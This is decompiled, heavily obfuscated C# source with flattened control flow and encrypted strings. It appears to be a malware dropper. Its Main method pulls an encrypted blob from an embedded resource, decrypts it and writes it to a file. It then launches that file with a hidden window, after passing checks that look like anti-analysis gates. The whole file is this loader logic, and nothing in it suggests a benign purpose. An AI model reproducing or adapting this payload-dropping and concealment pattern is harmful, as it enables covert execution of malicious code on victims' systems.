using System;
using System.Diagnostics;
using System.Resources;
using System.Runtime.InteropServices;
using ns4;
using ns6;

namespace ns1;

internal sealed class Class5
{
	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 588)]
	private struct Struct2
	{
	}

	internal static readonly char[] char_0;

	internal static readonly char[] char_1;

	internal static readonly string[] string_0;

	internal static Struct2 struct2_0/* Not supported: data(00 00 18 00 00 00 2F 3D AA 3C 3C 36 33 30 C1 27 A3 30 B9 04 C7 35 25 3D AE 3C 08 36 41 30 C5 27 83 30 98 04 9A 35 06 3D B5 3C 1D 36 4D 30 83 27 AF 30 A3 04 9B 35 01 00 00 01 00 00 FF 3C 1F 36 49 30 D9 27 90 30 8B 04 B0 35 3E 3D 8D 3C 0E 36 45 30 D5 27 81 30 B0 04 C8 35 0A 3D F7 3C 03 36 35 30 FA 27 B3 30 90 04 B6 35 04 3D A3 3C 08 36 30 30 E6 27 B0 30 EB 04 88 35 1A 3D 92 3C 06 36 63 30 DB 27 F2 30 9A 04 AA 35 29 3D F3 3C 0E 36 68 30 FF 27 FF 30 A1 04 BD 35 34 3D B3 3C 31 36 61 30 E1 27 99 30 97 04 CD 35 1D 3D 89 3C 34 36 79 30 C2 27 84 30 E9 04 AD 35 08 3D AA 3C 07 36 4D 30 C3 27 9C 30 AC 04 92 35 79 3D 9C 3C 35 36 58 30 F4 27 AB 30 9E 04 C7 35 24 3D 82 3C 30 36 4A 30 F5 27 A7 30 83 04 97 35 3C 3D B0 3C 29 36 53 30 CC 27 9E 30 E8 04 93 35 19 3D 84 3C 2D 36 59 30 9D 27 8F 30 A9 04 BC 35 7B 3D FE 3C 36 36 39 30 F8 27 80 30 8F 04 99 35 20 3D F6 3C 2B 36 34 30 EE 27 B8 30 BF 04 B8 35 28 3D B1 3C 3D 36 6E 30 9F 27 A6 30 9D 04 8A 35 0E 3D 94 3C 2F 36 7A 30 FD 27 A0 30 B8 04 AC 35 7A 3D A0 3C 76 36 42 30 EF 27 FE 30 82 04 A4 35 7C 3D 8E 3C 28 36 4C 30 CB 27 9A 30 BC 04 CF 35 35 3D 8F 3C 33 36 47 30 9E 27 83 30 9C 04 AE 35 1B 3D AD 3C 7D 36 4F 30 EC 27 92 30 B9 04 94 35 06 3D 8A 3C 70 36 52 30 E0 27 BA 30 8D 04 C6 35 7F 3D F5 3C 74 36 37 30 C5 27 A8 30 ED 04 B4 35 2E 3D BE 3C 1C 36 32 30 98 27 A9 30 91 04 9C 35 03 3D 85 3C 12 36 76 30 E9 27 F3 30 B5 04 AB 35 06 3D F1 3C 73 36 6B 30 C6 27 82 30 95 04 98 35 1E 3D A9 3C 04 36 64 30 9A 27 8E 30 EC 04 CA 35 2F 3D 87 3C 10 36 75 30 EA 27 BB 30 B2 04 9B 35 27 3D 91 3C 00 36 77 30 DF 27 AD 30 92 04 86 35 17 3D B5 3C 0D 36 56 30 D7 27 F8 30 B1 04 B5 35 0B 3D 80 3C 16 36 4B 30 94 27 FA 30 E2 04 8E 35 18 3D A8 3C 0A 36 44 30 E5 27 9F 30 B4 04 B1 35 21 3D 02 00 01 00 00 00 1D 36 03 00 01 00 00 00 4D 30) */;

	internal static bool bool_0;

	[STAThread]
	public static void Main()
	{
		if (!Class24.smethod_164())
		{
			return;
		}
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		byte[] array2 = default(byte[]);
		byte[] array3 = default(byte[]);
		byte[] array = default(byte[]);
		string text = default(string);
		ResourceManager resourceManager = default(ResourceManager);
		Process process = default(Process);
		try
		{
			if (!Class36.smethod_0())
			{
				return;
			}
			num = 22;
			num2 = 4;
			num = 2;
			while (true)
			{
				num = 7;
				while (true)
				{
					Class24.smethod_17();
					num3 = 1;
					num2 = 12;
					num = 2;
					num = 26;
					while (true)
					{
						IL_0224:
						num = 25;
						int num4 = 2;
						while (true)
						{
							num2 = num4;
							num = 2;
							switch (num2)
							{
							case 13:
								num = 28;
								array2 = Class24.smethod_79(Class24.smethod_68(923, 1020), Class24.smethod_116(1603078151, 1), 479, 432);
								num = 3;
								num2 = 6;
								num = 2;
								goto case 6;
							case 6:
								num = 21;
								num3 = 7;
								num2 = 12;
								num = 2;
								num = 26;
								goto IL_0062;
							case 12:
								break;
							case 11:
								num = 13;
								array3 = Class24.smethod_50(array, array2);
								num = 1;
								goto IL_00e5;
							case 8:
								num = 12;
								num3 = 2;
								num2 = 12;
								num = 2;
								num = 26;
								goto IL_00a5;
							case 9:
								num = 29;
								goto IL_00f7;
							case 7:
								num = 10;
								num3 = 6;
								num2 = 12;
								num = 2;
								num = 26;
								goto IL_00cb;
							case 5:
								num = 0;
								goto IL_00ff;
							case 3:
								num = 1;
								goto IL_00e5;
							case 2:
								num = 14;
								text = Class24.smethod_183(Class24.smethod_105(908, 1008), Class24.smethod_116(1603078173, 0), 114, 15);
								num = 15;
								num2 = 7;
								num = 2;
								goto case 7;
							case 1:
								num = 18;
								resourceManager = new ResourceManager(Class24.smethod_116(1603078405, 6), Class24.smethod_77(2, 32));
								array = (byte[])Class24.smethod_106(resourceManager, Class24.smethod_116(1603078457, 6), 524, 554);
								num = 11;
								num2 = 0;
								num = 2;
								goto case 0;
							case 0:
								num = 24;
								num3 = 3;
								num2 = 12;
								num = 2;
								num = 26;
								goto IL_00ae;
							default:
								goto end_IL_01dd;
							case 4:
								goto end_IL_022c;
							case 10:
								num = 23;
								Class24.smethod_181(Class24.smethod_151(process, 258, 331), ProcessWindowStyle.Hidden, 995, 977);
								goto IL_026a;
							case 14:
								{
									num = 9;
									goto IL_026a;
								}
								IL_026a:
								Class24.smethod_157(process, 199, 131);
								return;
								IL_00e5:
								Class24.smethod_186(text, array3, 742, 654);
								goto IL_00f7;
								IL_00f7:
								process = new Process();
								num = 0;
								goto IL_00ff;
								IL_00ff:
								Class24.smethod_124(Class24.smethod_151(process, 146, 219), text, 453, 450);
								num2 = 8;
								num = 2;
								goto case 8;
							}
							num = 26;
							switch (num3)
							{
							case 7:
								break;
							default:
								goto IL_0094;
							case 0:
								goto IL_009c;
							case 2:
								goto IL_00a5;
							case 3:
								goto IL_00ae;
							case 4:
								goto IL_00b8;
							case 5:
								goto IL_00c1;
							case 6:
								goto IL_00cb;
							case 1:
								goto IL_0224;
							}
							goto IL_0062;
							IL_0062:
							num = 6;
							num4 = 1;
							continue;
							IL_00cb:
							num = 19;
							num4 = 13;
							continue;
							IL_00c1:
							num = 31;
							num4 = 9;
							continue;
							IL_00b8:
							num = 4;
							num4 = 13;
							continue;
							IL_00ae:
							num = 17;
							num4 = 11;
							continue;
							IL_00a5:
							num = 8;
							num4 = 10;
							continue;
							IL_009c:
							num = 20;
							num4 = 0;
							continue;
							IL_0094:
							num = 5;
							num4 = 2;
							continue;
							end_IL_01dd:
							break;
						}
						break;
					}
					num = 7;
					continue;
					end_IL_022c:
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num5 = default(int);
			int num6 = default(int);
			Class24.smethod_20(exception_, new object[11]
			{
				array2, array3, process, array, resourceManager, text, num3, num2, num5, num,
				num6
			});
		}
	}

	static Class5()
	{
		Class42.hMqjKD0znI7T7();
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		char[] array = default(char[]);
		try
		{
			num = 4;
			num2 = 10;
			num = 14;
			while (true)
			{
				num = 11;
				while (true)
				{
					num3 = 5;
					num2 = 2;
					num = 14;
					num = 7;
					while (true)
					{
						IL_019e:
						num = 21;
						int num4 = 0;
						while (true)
						{
							num2 = num4;
							num = 14;
							char[] array_;
							switch (num2)
							{
							case 13:
								num = 16;
								array[7] = '㗾';
								string_0 = new string[4];
								num3 = 7;
								num2 = 2;
								num = 14;
								num = 7;
								goto IL_0031;
							case 12:
								num = 12;
								goto IL_003d;
							case 1:
								num = 17;
								array = new char[8];
								num3 = 0;
								num2 = 2;
								num = 14;
								num = 7;
								goto IL_0055;
							case 9:
								num = 26;
								goto IL_0060;
							case 7:
								num = 6;
								num3 = 4;
								num2 = 2;
								num = 14;
								num = 7;
								goto IL_0094;
							case 6:
								num = 8;
								array[6] = 'ӛ';
								num2 = 5;
								num = 14;
								goto case 5;
							case 5:
								num = 19;
								array[2] = '㙅';
								array[5] = 'ナ';
								num3 = 3;
								num = 29;
								num2 = 2;
								num = 14;
								num = 7;
								goto IL_00ca;
							case 4:
								num = 28;
								array[4] = '➭';
								array[1] = '㳆';
								array[3] = '\u3000';
								num = 13;
								num2 = 7;
								num = 14;
								goto case 7;
							case 3:
								num = 22;
								array[0] = '㵍';
								num2 = 13;
								num = 14;
								goto case 13;
							case 2:
								break;
							case 0:
								num = 27;
								Class24.smethod_17();
								goto IL_0060;
							default:
								goto end_IL_015a;
							case 10:
								goto end_IL_01a7;
							case 8:
								num = 9;
								char_0 = array;
								num = 25;
								return;
							case 11:
								{
									num = 25;
									return;
								}
								IL_0060:
								array_ = new char[294];
								Class24.smethod_55((Array)array_, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/, 420, 396);
								char_1 = array_;
								num = 12;
								goto IL_003d;
								IL_003d:
								num2 = 1;
								num = 14;
								goto case 1;
							}
							num = 7;
							switch (num3)
							{
							case 7:
								break;
							case 0:
								goto IL_0055;
							case 4:
								goto IL_0094;
							case 3:
								goto IL_00ca;
							default:
								goto IL_0136;
							case 1:
								goto IL_013c;
							case 2:
								goto IL_0141;
							case 6:
								goto IL_0148;
							case 5:
								goto IL_019e;
							}
							goto IL_0031;
							IL_0031:
							num = 20;
							num4 = 8;
							continue;
							IL_0148:
							num = 1;
							num4 = 5;
							continue;
							IL_0141:
							num = 23;
							num4 = 13;
							continue;
							IL_013c:
							num = 2;
							num4 = 5;
							continue;
							IL_0136:
							num = 15;
							num4 = 0;
							continue;
							IL_00ca:
							num = 18;
							num4 = 4;
							continue;
							IL_0094:
							num = 3;
							num4 = 3;
							continue;
							IL_0055:
							num = 0;
							num4 = 6;
							continue;
							end_IL_015a:
							break;
						}
						break;
					}
					num = 11;
					continue;
					end_IL_01a7:
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			int num5 = default(int);
			int num6 = default(int);
			Class24.smethod_9(exception_, (object)array, (object)num3, (object)num2, (object)num5, (object)num, (object)num6);
			throw;
		}
	}
}
